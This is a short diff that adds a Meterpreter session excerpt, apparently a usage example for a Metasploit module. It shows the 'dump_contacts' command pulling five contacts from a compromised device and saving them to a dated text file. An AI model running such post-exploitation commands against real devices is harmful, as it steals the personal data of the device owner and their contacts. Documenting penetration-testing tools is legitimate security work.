@@ -1,0 +1,4 @@
+meterpreter > dump_contacts
+
+[*] Fetching 5 contacts into list
+[*] Contacts list saved to: contacts_dump_20160308155744.txt
